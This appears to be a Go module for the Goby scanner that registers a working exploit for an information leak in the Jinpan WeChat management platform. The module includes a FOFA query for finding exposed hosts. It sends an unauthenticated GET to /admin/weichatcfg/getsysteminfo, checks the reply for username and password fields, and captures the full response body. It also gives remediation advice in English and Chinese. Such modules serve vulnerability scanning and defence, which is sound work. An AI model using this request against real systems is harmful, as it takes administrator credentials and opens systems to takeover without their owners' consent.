package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Jinpan WeChat management platform getsysteminfo information leakage vulnerability",
    "Description": "<p>Jinpan WeChat management platform is a WeChat public account management platform developed by Beijing Jinpan Pengtu Software Technology Co., Ltd.</p><p>There is an information leak in the Jinpan WeChat management platform getsysteminfo. Attackers can use this vulnerability to steal system management authority passwords and control the system.</p>",
    "Product": "WeChat-Management-Background",
    "Homepage": "http://www.goldlib.com.cn/",
    "DisclosureDate": "2023-08-12",
    "PostTime": "2023-08-12",
    "Author": "woo0nise@gmail.com",
    "FofaQuery": "body=\"weichatcfgcontroller.js\" || title=\"微信管理后台\"",
    "GobyQuery": "body=\"weichatcfgcontroller.js\" || title=\"微信管理后台\"",
    "Level": "2",
    "Impact": "<p>There is an information leak in the Jinpan WeChat management platform getsysteminfo. Attackers can use this vulnerability to steal system management authority passwords and control the system.</p>",
    "Recommendation": "<p>1. The official has fixed the vulnerability, please contact the manufacturer to fix the vulnerability: <a href=\"http://www.goldlib.com.cn/\">http://www.goldlib.com.cn/</a></p><p>2. Set access policies through security devices such as firewalls, and set whitelist access.</p><p>3. If it is not necessary, the public network is prohibited from accessing the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/admin/weichatcfg/getsysteminfo",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "username",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "password",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/admin/weichatcfg/getsysteminfo",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "username",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "password",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.5",
    "Translation": {
        "CN": {
            "Name": "金盘微信管理平台 getsysteminfo 信息泄漏漏洞",
            "Product": "微信管理后台",
            "Description": "<p>金盘微信管理平台是北京金盘鹏图软件技术有限公司研发的一款微信公众号管理平台。<br></p><p>金盘微信管理平台&nbsp;getsysteminfo 存在信息泄漏，攻击者可通过该漏洞窃取系统管理权限口令并控制系统。<br></p>",
            "Recommendation": "<p>1、官方已修复该漏洞，请用户联系厂商修复漏洞：<a href=\"http://www.goldlib.com.cn/\" target=\"_blank\">http://www.goldlib.com.cn/</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>金盘微信管理平台 getsysteminfo 存在信息泄漏，攻击者可通过该漏洞窃取系统管理权限口令并控制系统。<br><br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "Jinpan WeChat management platform getsysteminfo information leakage vulnerability",
            "Product": "WeChat-Management-Background",
            "Description": "<p>Jinpan WeChat management platform is a WeChat public account management platform developed by Beijing Jinpan Pengtu Software Technology Co., Ltd.</p><p>There is an information leak in the Jinpan WeChat management platform getsysteminfo. Attackers can use this vulnerability to steal system management authority passwords and control the system.</p>",
            "Recommendation": "<p>1. The official has fixed the vulnerability, please contact the manufacturer to fix the vulnerability: <a href=\"http://www.goldlib.com.cn/\" target=\"_blank\">http://www.goldlib.com.cn/</a></p><p>2. Set access policies through security devices such as firewalls, and set whitelist access.</p><p>3. If it is not necessary, the public network is prohibited from accessing the system.</p>",
            "Impact": "<p>There is an information leak in the Jinpan WeChat management platform getsysteminfo. Attackers can use this vulnerability to steal system management authority passwords and control the system.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10821"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}